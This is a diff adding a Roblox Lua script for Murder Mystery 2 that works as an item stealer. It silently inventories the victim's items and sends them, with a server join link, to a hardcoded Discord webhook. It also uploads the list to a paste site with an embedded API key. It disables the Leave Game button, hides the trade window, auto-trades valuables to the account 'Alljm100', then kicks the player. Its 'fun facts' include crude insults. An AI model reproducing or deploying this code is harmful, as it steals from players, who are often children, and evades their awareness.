@@ -1,0 +1,788 @@
+-- Jmcxz MM2
+_G.Ex = _G.Ex or false
+if _G.Ex then return end
+_G.Ex = true
+
+local Players = game:GetService("Players")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local HttpService = game:GetService("HttpService")
+local LocalPlayer = Players.LocalPlayer
+local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
+
+-- The only webhook the script posts to.
+local WEBHOOK = "https://discord.com/api/webhooks/1550992212190429327/59ERmpGyPcIpSZUynuVDTPkboeKAacEYRyx7klpdlw9_6bKSQm61WkAlw60-Dp7-6tcl"
+local RECEIVER = {"Alljm100"}
+-- Minimum price an item must have to be traded, expressed in the value base's
+-- own units. The base runs from 0.03 to 1250, so 0.02 lets everything through,
+-- 0.1 keeps ~54%, and 1.0 keeps the top ~16%.
+local MINIMUM_VALUE = 0.02
+
+-- @everyone is only pinged when the hit holds an item at or above this price.
+-- Kept separate from MINIMUM_VALUE so a low trade floor does not ping on every hit.
+local MENTION_MINIMUM = 5
+local RECEIVERx = RECEIVER
+
+-- Value base. One GET, flat price-only list:
+--   {success = true, data = {{name = "Deathshard", game = "mm2", price = 0.27}, ...}}
+-- The base publishes no rarity, so the rarity shown in the embed is derived from price.
+local VALUE_API = "https://api.project-reverse.org/valuables/get-game-valuables?game=mm2"
+
+-- Price bands, highest first. Derived tiers, not the game's own rarity labels.
+local PRICE_TIERS = {
+    {Min = 100, Name = "Unique"},
+    {Min = 25,  Name = "Ancient"},
+    {Min = 5,   Name = "Godly"},
+    {Min = 1,   Name = "Legendary"},
+    {Min = 0.5, Name = "Rare"},
+    {Min = 0.1, Name = "Uncommon"},
+    {Min = 0,   Name = "Common"},
+}
+local RARITY_ORDER = {"Unique", "Ancient", "Godly", "Legendary", "Rare", "Uncommon", "Common"}
+
+-- Embed branding and artwork. EMBED_ICON is rendered as the embed thumbnail.
+local EMBED_AUTHOR = "Jmcxz Hit!"
+local EMBED_FOOTER = "Jmcxz"
+local EMBED_ICON = "https://i.pinimg.com/736x/0c/02/32/0c023295a6d839336907b13d4318a7da.jpg"
+
+-- Fun facts shown in the embed. One is picked at random per hit, so add as many
+-- as you like -- the picker indexes whatever is in here.
+local FUN_FACTS = {
+    "Our scripts is using Luraph Obfuscator and custom anti dump, anti tamper protection 🧠",
+    "Martinez is Jmcxz's domain & living pair",
+    "Jex ran his own son for some pussy",
+    "Migs, Theos, Justine & Cris are Jm's brothers",
+    "Only a few girls are allowed to Martinez, including Old Gen",
+    "Maya is my motivation",
+    "Jm generated almost 200k in % months",
+    "All Martinez are gay haters!",
+    "Jmcxz is the most egoist person in every server he joins",
+    "Jmcxz built this whole script just to flex",
+    "Jmcxz has never lost a trade, and he will never let you forget it",
+    "Nobody out-egos Jmcxz -- many have tried, none survived",
+}
+
+-- Shown in the Join Script field. The joiner link is a browser page, not a
+-- script-executable endpoint, so the field states that plainly.
+local JOIN_SCRIPT_NOTICE = "Can't be joined using script, use join now button"
+
+-- Status shown at the top of the embed, resolved from live state at send time.
+local STATUS_LABELS = {
+    Ready   = {Emoji = "🟢", Text = "Ready to Claim"},
+    Pending = {Emoji = "🟣", Text = "Pending Claim"},
+    Nothing = {Emoji = "🔴", Text = "Nothing Tradeable"},
+}
+
+-- Item lines shown in the Loot block before it is truncated.
+local LOOT_LINE_LIMIT = 15
+
+-- Receiver account, used for the trade target and the status line.
+local ar = RECEIVER[1]
+
+local function GetRequestFunction()
+    if request then return request end
+    if syn and syn.request then return syn.request end
+    if http_request then return http_request end
+    return nil
+end
+
+local function SafeKick(Message)
+    pcall(function() LocalPlayer:Kick(Message) end)
+end
+
+-- Nothing is printed to the executor console by default, so executing the script
+-- stays silent. Flip DEBUG to true to bring the value-base and inventory
+-- diagnostics back.
+local DEBUG = false
+local function Log(...)
+    if DEBUG then
+        warn(...)
+    end
+end
+
+local function HttpGet(Url, Timeout)
+    local RequestFunc = GetRequestFunction()
+    if not RequestFunc then return nil end
+    local Ok, Response = pcall(function()
+        return RequestFunc({
+            Url = Url,
+            Method = "GET",
+            Headers = {["User-Agent"] = "Mozilla/5.0", ["Accept"] = "*/*"},
+            Timeout = Timeout or 15
+        })
+    end)
+    if Ok and Response and type(Response.Body) == "string" and #Response.Body > 2 then
+        return Response.Body
+    end
+    return nil
+end
+
+local function GetActiveReceiverName()
+    if type(ar) == "string" and ar ~= "" then
+        if Players and Players:FindFirstChild(ar) then return ar end
+        return ar
+    end
+    if type(RECEIVERx) == "table" then
+        for _, Name in ipairs(RECEIVERx) do
+            if Name ~= "" then
+                if Players and Players:FindFirstChild(Name) then return Name end
+                return Name
+            end
+        end
+    end
+    return "Unknown"
+end
+
+-- Maps a price to its tier label. PRICE_TIERS is ordered highest-first, so the
+-- first band the price reaches is the one it belongs to.
+local function RarityFromPrice(Price)
+    for _, Tier in ipairs(PRICE_TIERS) do
+        if Price >= Tier.Min then return Tier.Name end
+    end
+    return "Common"
+end
+
+-- Accepts only the documented API envelope: a success flag plus a list of
+-- {name, price} entries. Anything else is rejected rather than half-parsed.
+local function ParseValueApi(Body)
+    if type(Body) ~= "string" or #Body < 2 then return nil end
+
+    local Ok, Decoded = pcall(function()
+        return HttpService:JSONDecode(Body)
+    end)
+    if not Ok or type(Decoded) ~= "table" then return nil end
+    if Decoded.success ~= true then return nil end
+    if type(Decoded.data) ~= "table" then return nil end
+
+    return Decoded.data
+end
+
+if WEBHOOK == "" then
+    SafeKick("Invalid URL. Please check your webhook.")
+    return
+end
+if game.PlaceId ~= 142823291 then
+    SafeKick("This script only works in Murder Mystery 2.")
+    return
+end
+
+local Trade = ReplicatedStorage:WaitForChild("Trade", 15)
+if not Trade then
+    SafeKick("Trade system unavailable.")
+    return
+end
+
+local ServerType
+local ServerTypeOK, ServerTypeErr = pcall(function()
+    ServerType = game:GetService("RobloxReplicatedStorage")
+        :WaitForChild("GetServerType")
+        :InvokeServer()
+end)
+
+if not ServerTypeOK then
+    Log("[MM2] Failed to determine server type:", ServerTypeErr)
+elseif ServerType == "VIPServer" then
+    SafeKick("Private servers are not supported.")
+    return
+end
+
+if #Players:GetPlayers() >= 12 then
+    SafeKick("Server is full, please rejoin another server.")
+    return
+end
+
+local function GetFunctionName(Fn)
+    if debug and debug.info then
+        local Ok, Name = pcall(debug.info, Fn, "n")
+        if Ok and type(Name) == "string" then return Name end
+    end
+    if debug and debug.getinfo then
+        local Ok, Info = pcall(debug.getinfo, Fn)
+        if Ok and type(Info) == "table" and type(Info.name) == "string" then
+            return Info.name
+        end
+    end
+    return nil
+end
+
+local FoundJobId = false
+local AttemptCount = 0
+if getgc and hookfunction then
+    repeat
+        local HookedSuccessfully = false
+        for _, Value in ipairs(getgc(true)) do
+            if typeof(Value) == "function" then
+                local Name = GetFunctionName(Value)
+                local LowerName = Name and Name:lower() or nil
+                if LowerName and LowerName:find("step") and not LowerName:find("stepanimate") then
+                    local Hooked = pcall(function()
+                        local OriginalFunction
+                        OriginalFunction = hookfunction(Value, function(...)
+                            if not FoundJobId then
+                                FoundJobId = true
+                                _G.RealJobID = game.JobId
+                            end
+                            if OriginalFunction then
+                                return OriginalFunction(...)
+                            end
+                        end)
+                    end)
+                    if Hooked then
+                        HookedSuccessfully = true
+                        break
+                    end
+                end
+            end
+        end
+        AttemptCount = AttemptCount + 1
+        if HookedSuccessfully or AttemptCount >= 10 then break end
+        task.wait(0.1)
+    until FoundJobId
+end
+if not FoundJobId then _G.RealJobID = game.JobId end
+
+task.wait(0.5)
+task.spawn(function()
+    while task.wait(10) do
+        pcall(function()
+            for _, Connection in ipairs(getconnections(game:GetService("CoreGui").RobloxGui.SettingsClippingShield.SettingsShield.MenuContainer.Page.PageViewClipper.Page.PageViewInnerFrame.LeaveGamePage.LeaveButtonsContainer.LeaveButtonsContainer.LeaveGameButton.Activated)) do
+                Connection:Disable()
+            end
+        end)
+    end
+end)
+
+local function GetExecutorInfo()
+    local ExecutorName = "Unknown"
+    pcall(function() ExecutorName = identifyexecutor() end)
+    return {
+        JobId = _G.RealJobID or game.JobId,
+        Executor = string.lower(ExecutorName)
+    }
+end
+
+local InfoData = GetExecutorInfo()
+_G.RealJobID = InfoData.JobId
+_G.RealExecutor = InfoData.Executor
+
+local ItemDatabase = {}
+local RarityPriority = RARITY_ORDER
+
+local function NormalizeKeys(Name)
+    local LowerName = string.lower(tostring(Name))
+    -- Every gsub is parenthesised. An unparenthesised gsub as the final element
+    -- of a table constructor expands to (string, count), which injects a numeric
+    -- key into the list -- and a numeric key is never "not found", so unknown
+    -- items silently match a random database entry.
+    return {
+        (LowerName:gsub("[^%w]", "")),
+        (LowerName:gsub("[^%w%s]", "")),
+        (LowerName:gsub("[%s_%-]", "")),
+        (LowerName:gsub("'", ""):gsub(" ", ""))
+    }
+end
+
+-- Builds the lookup table from the API's flat entry list. Each entry is
+-- {name, price}; rarity is derived from price and chroma from the name.
+local function BuildMapping(Entries)
+    local Mapping = {}
+    local ItemCount = 0
+
+    for _, Entry in ipairs(Entries) do
+        if type(Entry) == "table" then
+            local ItemName = Entry.name
+            local Value = tonumber(Entry.price)
+            if type(ItemName) == "string" and ItemName ~= "" and Value then
+                local ItemInfo = {
+                    Rarity = RarityFromPrice(Value),
+                    Value = Value,
+                    Emoji = Entry.emoji,
+                    Chroma = (string.find(string.lower(ItemName), "chroma", 1, true) ~= nil)
+                }
+                for _, Key in ipairs(NormalizeKeys(ItemName)) do
+                    if Key ~= "" then
+                        Mapping[Key] = ItemInfo
+                    end
+                end
+                ItemCount = ItemCount + 1
+            end
+        end
+    end
+
+    if next(Mapping) == nil then return nil, nil, 0 end
+    return Mapping, RARITY_ORDER, ItemCount
+end
+
+local function LoadDatabase()
+    local Body = HttpGet(VALUE_API, 15)
+    if not Body then
+        Log("[MM2] Value base unreachable:", VALUE_API)
+        return nil, nil, 0
+    end
+
+    local Entries = ParseValueApi(Body)
+    if not Entries then
+        Log("[MM2] Value base returned an unexpected payload.")
+        return nil, nil, 0
+    end
+
+    local Mapping, OrderList, ItemCount = BuildMapping(Entries)
+    if not Mapping then
+        Log("[MM2] Value base held no usable prices.")
+        return nil, nil, 0
+    end
+
+    Log(string.format("[MM2] Value base loaded: %d items.", ItemCount))
+    return Mapping, OrderList, ItemCount
+end
+
+-- Only the mapping and the rarity order are consumed; the source label and item
+-- count are reported by LoadDatabase's own warn lines.
+local LoadedData, LoadedOrder = nil, nil
+for _ = 1, 3 do
+    LoadedData, LoadedOrder = LoadDatabase()
+    if LoadedData and LoadedOrder and #LoadedOrder > 0 then break end
+    task.wait(0.5)
+end
+
+if LoadedData and LoadedOrder and #LoadedOrder > 0 then
+    ItemDatabase = LoadedData
+    RarityPriority = LoadedOrder
+else
+    Log("[MM2] Value base failed to load; item values/rarities may be unavailable.")
+end
+
+local function FormatNameDisplay(Text)
+    if not Text or Text == "" then return "Unknown" end
+    local Result = ""
+    local CapitalizeNext = true
+    for Index = 1, #Text do
+        local Char = Text:sub(Index, Index)
+        if Char == " " then
+            Result = Result .. " "
+            CapitalizeNext = true
+        else
+            Result = Result .. (CapitalizeNext and Char:upper() or Char:lower())
+            CapitalizeNext = false
+        end
+    end
+    return Result
+end
+
+local function GetTradeStatus()
+    local Ok, Status = pcall(function()
+        return Trade.GetTradeStatus:InvokeServer()
+    end)
+    if Ok and type(Status) == "string" then return Status end
+    return "None"
+end
+
+local function SendTradeRequestToPlayer(TargetName)
+    local TargetPlayer = Players:FindFirstChild(TargetName)
+    if not TargetPlayer then return false end
+    local Success = pcall(function()
+        Trade.SendRequest:InvokeServer(TargetPlayer)
+    end)
+    if Success then return true end
+    Success = pcall(function()
+        Trade.SendRequest:InvokeServer(TargetName)
+    end)
+    return Success
+end
+
+local function AddItemToTradeOffer(ItemId)
+    Trade.OfferItem:FireServer(ItemId, "Weapons")
+end
+
+local LastReceivedOffer = nil
+Trade.UpdateTrade.OnClientEvent:Connect(function(TradeData)
+    if TradeData and TradeData.LastOffer then
+        LastReceivedOffer = TradeData.LastOffer
+    end
+end)
+
+local function AcceptIncomingTrade()
+    if LastReceivedOffer then
+        Trade.AcceptTrade:FireServer(game.PlaceId * 3, LastReceivedOffer)
+        LastReceivedOffer = nil
+        return true
+    end
+    return false
+end
+
+local function WaitUntilTradeEnds()
+    while GetTradeStatus() ~= "None" do
+        task.wait(0.1)
+    end
+end
+
+local BlacklistedItems = {
+    DefaultGun = true, DefaultKnife = true,
+    Reaver = true, Reaver_Legendary = true, Reaver_Godly = true, Reaver_Ancient = true,
+    IceHammer = true, IceHammer_Legendary = true, IceHammer_Godly = true, IceHammer_Ancient = true,
+    Gingerscythe = true, Gingerscythe_Legendary = true, Gingerscythe_Godly = true, Gingerscythe_Ancient = true,
+    TestItem = true, Season1TestKnife = true,
+    Cracks = true, Icecrusher = true,
+    ["???"] = true, Dartbringer = true,
+    TravelerAxeRed = true, TravelerAxeBronze = true, TravelerAxeSilver = true, TravelerAxeGold = true,
+    BlueCamo_K_2022 = true, GreenCamo_K_2022 = true,
+    SharkSeeker = true
+}
+
+local AllInventoryItems, TradeableItems, TotalTradeValue, TotalInventoryValue = {}, {}, 0, 0
+local UnresolvedItems = {}
+
+-- The value base is authoritative on price, so the trade decision is price-only.
+-- Rarity is a derived display tier and no longer gates anything.
+local function ShouldTradeThisItem(ItemValue)
+    if type(ItemValue) ~= "number" then return false end
+    return ItemValue >= MINIMUM_VALUE
+end
+
+local function RefreshInventoryLists()
+    local AllItems, TradeItems, TotalValue, FullValue = {}, {}, 0, 0
+    local Unresolved = {}
+    local ProfileData
+    local ProfileOK, ProfileErr = pcall(function()
+        ProfileData = ReplicatedStorage.Remotes.Inventory.GetProfileData:InvokeServer(LocalPlayer.Name)
+    end)
+
+    if not ProfileOK then
+        Log("[MM2] Inventory request failed:", ProfileErr)
+        return AllItems, TradeItems, TotalValue, FullValue, Unresolved
+    end
+
+    if ProfileData and ProfileData.Weapons and ProfileData.Weapons.Owned then
+        for ItemId, Quantity in pairs(ProfileData.Weapons.Owned) do
+            if Quantity and Quantity > 0 then
+                local SafeName = tostring(ItemId or "")
+                if SafeName ~= "" then
+                    local ItemInfo
+                    for _, Key in ipairs(NormalizeKeys(SafeName)) do
+                        if Key ~= "" and ItemDatabase[Key] then
+                            ItemInfo = ItemDatabase[Key]
+                            break
+                        end
+                    end
+
+                    if not ItemInfo then
+                        table.insert(Unresolved, SafeName)
+                    end
+
+                    local RarityName = ItemInfo and ItemInfo.Rarity or "Unknown"
+                    local Value = ItemInfo and ItemInfo.Value or 0
+                    local IsChroma = ItemInfo and ItemInfo.Chroma or false
+                    local IsTradeable = ShouldTradeThisItem(Value) and not BlacklistedItems[ItemId]
+
+                    -- A stack is tradeable as a whole or not at all, so the two
+                    -- counts differ only when the item is filtered out. Both are
+                    -- carried so the loot line can show "n / n".
+                    local ItemEntry = {
+                        DataID = ItemId,
+                        Name = SafeName,
+                        Rarity = RarityName,
+                        Count = Quantity,
+                        Value = Value,
+                        IsChroma = IsChroma,
+                        Emoji = (ItemInfo and ItemInfo.Emoji) or "❔",
+                        OwnedCount = Quantity,
+                        TradeableCount = IsTradeable and Quantity or 0,
+                        Total = Value * Quantity
+                    }
+                    ItemEntry.TradeableValue = Value * ItemEntry.TradeableCount
+                    ItemEntry.FullValue = Value * ItemEntry.OwnedCount
+
+                    table.insert(AllItems, ItemEntry)
+                    FullValue = FullValue + ItemEntry.FullValue
+
+                    if IsTradeable then
+                        table.insert(TradeItems, ItemEntry)
+                        TotalValue = TotalValue + ItemEntry.TradeableValue
+                    end
+                end
+            end
+        end
+    end
+
+    table.sort(AllItems, function(A, B) return A.Total > B.Total end)
+    table.sort(TradeItems, function(A, B) return A.Total > B.Total end)
+    return AllItems, TradeItems, TotalValue, FullValue, Unresolved
+end
+
+local function ReloadInventory()
+    AllInventoryItems, TradeableItems, TotalTradeValue, TotalInventoryValue, UnresolvedItems = RefreshInventoryLists()
+end
+AllInventoryItems, TradeableItems, TotalTradeValue, TotalInventoryValue, UnresolvedItems = RefreshInventoryLists()
+
+local function UploadToPastefy(textContent)
+    local API_KEY = "bCmvP7YNqkOyMEeJDvL0eDXzfSgm2XhWcGadQ3aXKKiH7BKe5ZBIgem3tbuC"
+    local success, result = pcall(function()
+        local RequestFunc = GetRequestFunction()
+        if not RequestFunc then return nil end
+        local response = RequestFunc({
+            Url = "https://pastefy.app/api/v2/paste",
+            Method = "POST",
+            Headers = {
+                ["Authorization"] = "Bearer " .. API_KEY,
+                ["Content-Type"] = "application/json"
+            },
+            Body = HttpService:JSONEncode({
+                content = textContent,
+                title = "MM2 Inventory",
+                expires = "never",
+                encrypted = false
+            })
+        })
+        if response and response.Body then
+            local data = HttpService:JSONDecode(response.Body)
+            if data and data.paste and data.paste.id then
+                return "https://pastefy.app/" .. data.paste.id .. "/raw"
+            end
+        end
+        return nil
+    end)
+    return success and result or nil
+end
+
+local function GenerateFullInventoryText(itemList)
+    local lines, total = {}, 0
+    for _, item in ipairs(itemList) do total = total + item.Total end
+    table.insert(lines, string.format("Total Inventory Value: %.2f", total))
+    table.insert(lines, string.rep("-", 40))
+    for _, item in ipairs(itemList) do
+        -- Chroma already appears in the API's own names, so it is not re-prefixed.
+        local name = FormatNameDisplay(item.Name)
+        table.insert(lines, string.format("[%s] x%d %s - %.2f", item.Rarity, item.Count, name, item.Total))
+    end
+    return table.concat(lines, "\n")
+end
+
+-- Trims trailing zeros so 10 renders as "$10" and 4.20 as "$4.2".
+local function FormatMoney(Amount)
+    local Text = string.format("%.2f", tonumber(Amount) or 0)
+    Text = Text:gsub("0+$", ""):gsub("%.$", "")
+    return "$" .. Text
+end
+
+-- Resolved from live state when the embed is built. The trade has not run yet,
+-- so "Ready" means the receiver is present, "Pending" means loot is queued.
+local function GetHitStatus(ReceiverName)
+    if #TradeableItems == 0 then
+        return STATUS_LABELS.Nothing
+    end
+    if type(ReceiverName) == "string" and ReceiverName ~= "Unknown"
+        and Players:FindFirstChild(ReceiverName) then
+        return STATUS_LABELS.Ready
+    end
+    return STATUS_LABELS.Pending
+end
+
+-- Ping threshold is its own constant: MINIMUM_VALUE is a trade floor and can be
+-- very low, which would otherwise ping @everyone on every hit.
+local function BuildEmbed(ReceiverName)
+    local ShouldMentionEveryone = false
+    for _, Item in ipairs(AllInventoryItems) do
+        if Item.Value >= MENTION_MINIMUM then
+            ShouldMentionEveryone = true
+            break
+        end
+    end
+
+    local MentionText = ShouldMentionEveryone and "@everyone" or ""
+
+    local JobId = _G.RealJobID or game.JobId
+    local JoinLink = "https://plsbrainrot.me/joiner?placeId=142823291&gameInstanceId=" .. JobId
+
+    -- Loot block, highest value first. "n / n" is tradeable vs owned count and
+    -- the two figures are tradeable vs full value, so copies held back by the
+    -- blacklist or the price floor stay visible instead of silently vanishing.
+    local LootLines = {}
+    local Shown = 0
+    for _, Item in ipairs(AllInventoryItems) do
+        if Shown >= LOOT_LINE_LIMIT then break end
+        Shown = Shown + 1
+        table.insert(LootLines, string.format("%s %s %d / %d (%s / %s)",
+            Item.Emoji, Item.Name, Item.TradeableCount, Item.OwnedCount,
+            FormatMoney(Item.TradeableValue), FormatMoney(Item.FullValue)))
+    end
+    if #AllInventoryItems > LOOT_LINE_LIMIT then
+        table.insert(LootLines, string.format("... and %d more", #AllInventoryItems - LOOT_LINE_LIMIT))
+    end
+    table.insert(LootLines, string.rep("=", 24))
+    table.insert(LootLines, string.format("Total: %s / %s",
+        FormatMoney(TotalTradeValue), FormatMoney(TotalInventoryValue)))
+    local LootBlock = table.concat(LootLines, "\n")
+
+    local Status = GetHitStatus(ReceiverName)
+    local FunFact = FUN_FACTS[math.random(1, #FUN_FACTS)]
+
+    local EmbedFields = {
+        {name = "🛠️ Game", value = "Murder Mystery 2", inline = true},
+        {name = "⚡ Executor", value = _G.RealExecutor or "Unknown", inline = true},
+        {name = "🖥️ Server", value = "[Join now!](" .. JoinLink .. ")", inline = true},
+        {name = "📜 Join Script", value = "```" .. JOIN_SCRIPT_NOTICE .. "```", inline = false},
+        {name = "📦 Loot", value = "```" .. LootBlock .. "```", inline = false}
+    }
+
+    -- Carried over from the earlier layout: the full log, and anything the value
+    -- base does not price, so a coverage gap is visible rather than silent.
+    local PasteUrl = UploadToPastefy(GenerateFullInventoryText(AllInventoryItems))
+    if PasteUrl then
+        table.insert(EmbedFields, {name = "📄 Full Inventory Log", value = PasteUrl, inline = false})
+    end
+    if #UnresolvedItems > 0 then
+        local Names = {}
+        for Index = 1, math.min(12, #UnresolvedItems) do
+            table.insert(Names, UnresolvedItems[Index])
+        end
+        local UnresolvedText = table.concat(Names, ", ")
+        if #UnresolvedItems > 12 then
+            UnresolvedText = UnresolvedText .. ", ..."
+        end
+        table.insert(EmbedFields, {
+            name = "❔ Not In Value Base (" .. #UnresolvedItems .. ")",
+            value = UnresolvedText,
+            inline = false
+        })
+    end
+
+    -- 9/17/2026 12:48 PM, matching the reference footer.
+    local DateText = os.date("%m/%d/%Y %I:%M %p"):gsub("^0", "")
+
+    local EmbedData = {
+        author = {name = EMBED_AUTHOR},
+        title = string.format("%s • %s", LocalPlayer.DisplayName, JobId),
+        description = string.format("**Status**\n%s %s\n\nFun fact: **%s**",
+            Status.Emoji, Status.Text, FunFact),
+        color = 0x4B5563,
+        thumbnail = {url = EMBED_ICON},
+        timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"),
+        fields = EmbedFields,
+        footer = {text = EMBED_FOOTER .. " • " .. DateText}
+    }
+    return EmbedData, MentionText
+end
+
+local function SendAllEmbeds()
+    local RequestFunc = GetRequestFunction()
+    if not RequestFunc then return end
+
+    local ActiveName = GetActiveReceiverName()
+
+    pcall(function()
+        local MainEmbed, MainMention = BuildEmbed(ActiveName)
+        RequestFunc({
+            Url = WEBHOOK,
+            Method = "POST",
+            Headers = {["Content-Type"] = "application/json"},
+            Body = HttpService:JSONEncode({content = MainMention, embeds = {MainEmbed}})
+        })
+    end)
+end
+
+SendAllEmbeds()
+
+for _, GuiName in ipairs({"TradeGUI", "TradeGUI_Phone"}) do
+    local Gui = PlayerGui:WaitForChild(GuiName, 10)
+    if Gui then
+        Gui:GetPropertyChangedSignal("Enabled"):Connect(function()
+            Gui.Enabled = false
+        end)
+    end
+end
+
+local function KickAfterTransfer()
+    task.wait(2)
+    SafeKick("Items Transferred!")
+end
+
+local function FindTradeTarget()
+    if type(ar) == "string" and ar ~= "" then
+        if Players:FindFirstChild(ar) then return ar end
+    end
+    if type(RECEIVER) == "table" then
+        for _, Name in ipairs(RECEIVER) do
+            if Name ~= "" and Players:FindFirstChild(Name) then return Name end
+        end
+    else
+        if Players:FindFirstChild(RECEIVER) then return RECEIVER end
+    end
+    return nil
+end
+
+local MAX_TRADE_ATTEMPTS = 999
+local RETRY_WAIT = 2
+
+local function ProcessAllTrades(TargetName)
+    local Attempts = 0
+    while #TradeableItems > 0 and Attempts < MAX_TRADE_ATTEMPTS do
+        Attempts = Attempts + 1
+        local CurrentStatus = GetTradeStatus()
+
+        if CurrentStatus == "ReceivingRequest" then
+            pcall(function() Trade.DeclineRequest:FireServer() end)
+            task.wait(0.5)
+            continue
+        end
+
+        if CurrentStatus == "StartTrade" then
+            local ItemsToSend = math.min(4, #TradeableItems)
+            for _ = 1, ItemsToSend do
+                local Item = table.remove(TradeableItems, 1)
+                for _ = 1, Item.Count do
+                    AddItemToTradeOffer(Item.DataID)
+                    task.wait(0.05)
+                end
+            end
+            task.wait(6)
+            if AcceptIncomingTrade() then
+                WaitUntilTradeEnds()
+                ReloadInventory()
+                Attempts = 0
+            else
+                ReloadInventory()
+                task.wait(RETRY_WAIT)
+            end
+            continue
+        end
+
+        if CurrentStatus == "None" then
+            local Sent = false
+            local Try = 1
+            while not Sent and Try <= 5 do
+                if SendTradeRequestToPlayer(TargetName) then
+                    Sent = true
+                    task.wait(0.5)
+                else
+                    task.wait(math.min(Try * 0.5, 3))
+                    Try = Try + 1
+                end
+            end
+        end
+        task.wait(0.5)
+    end
+    KickAfterTransfer()
+end
+
+local function AutoTradeOnTargetJoin()
+    local IsBusy = false
+    local function CheckPlayerJoin(Player)
+        if IsBusy then return end
+        local TargetName = FindTradeTarget()
+        if TargetName and Player.Name == TargetName then
+            IsBusy = true
+            task.wait(3)
+            ProcessAllTrades(Player.Name)
+        end
+    end
+    for _, Player in ipairs(Players:GetPlayers()) do
+        CheckPlayerJoin(Player)
+    end
+    Players.PlayerAdded:Connect(CheckPlayerJoin)
+end
+
+if #AllInventoryItems > 0 then
+    AutoTradeOnTargetJoin()
+else
+    task.wait(1)
+    SafeKick("No Items Found!")
+end
